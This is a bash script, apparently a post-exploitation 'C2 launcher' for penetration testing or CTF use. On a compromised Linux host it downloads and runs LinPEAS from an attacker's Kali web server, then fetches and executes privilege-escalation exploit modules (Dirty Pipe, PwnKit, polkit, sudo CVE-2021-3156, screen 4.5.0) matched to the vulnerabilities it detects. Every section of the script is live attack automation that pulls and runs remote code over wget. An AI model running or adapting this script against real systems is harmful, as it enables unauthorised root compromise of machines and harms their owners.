#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

KALI_IP=""
KALI_PORT="80"
while [[ $# -gt 0 ]]; do
  case $1 in
    --ip)   KALI_IP="$2"; shift 2 ;;
    --port) KALI_PORT="$2"; shift 2 ;;
    *) echo "[-] Unknown option $1"; exit 1 ;;
  esac
done
[[ -z $KALI_IP ]] && { echo "Usage: $0 --ip <KALI_IP> [--port <PORT>]"; exit 1; }

echo "[*] Attacker Web Server →  http://$KALI_IP:$KALI_PORT"

WORKDIR="/tmp/c2_auto"
LOG="$WORKDIR/linpeas.log"
mkdir -p "$WORKDIR"; cd "$WORKDIR"

# ───────────── Download and run LinPEAS ─────────────
if ! [ -f linpeas.sh ]; then
  echo "[*] Downloading linpeas.sh …"
  wget -q "http://$KALI_IP:$KALI_PORT/linpeas.sh" -O linpeas.sh
  chmod +x linpeas.sh
fi
echo "[*] Running LinPEAS quietly…"
bash ./linpeas.sh -q -a > "$LOG"

# ───────────── Helper: Download + Execute ─────────────
run_module () {
  local module="$1"
  echo "[*] → Executing $module"
  wget -q "http://$KALI_IP:$KALI_PORT/$module" -O "$module"
  chmod +x "$module"
  ./"$module" --ip "$KALI_IP" --port "$KALI_PORT" && echo "[+] $module finished"
  echo ""
}

# ───────────── Parse and Launch Modules ─────────────
KERNEL=$(uname -r)

if [[ $KERNEL =~ ^5\.[89]|^5\.[1-9][0-9] ]] \
   && grep -qi 'CVE-2022-0847' "$LOG"; then
  run_module dirtypipe.sh
fi

if grep -qi 'CVE-2021-4034' "$LOG" || grep -q 'pkexec version' "$LOG"; then
  run_module pwnkit.sh
fi

if grep -q 'pkexec version 0.11' "$LOG" && grep -qE '113|114|115|116|117|118' "$LOG"; then
  run_module polkit3560.sh
fi

if grep -qi 'sudo version 1.8.31' "$LOG" || grep -q 'CVE-2021-3156' "$LOG"; then
  run_module sudo3156.sh
fi

if grep -q 'screen v4.5.0' "$LOG" && grep -q 'rws' "$LOG" && grep -q 'screen' "$LOG"; then
  run_module screen450.sh
fi

# ───────────── Always run unix-privesc-check ─────────────
echo "[*] Running unix-privesc-check for misconfigurations…"
wget -q "http://$KALI_IP:$KALI_PORT/unix-privesc-check" -O unix-privesc-check
chmod +x unix-privesc-check
./unix-privesc-check standard > "$WORKDIR/unix-privesc-check.log" 2>&1 && echo "[+] unix-privesc-check complete"

# ───────────── Summary ─────────────
echo "[*] C2 launcher complete. Log files created:"
ls -lh "$WORKDIR" | grep '\.log$'

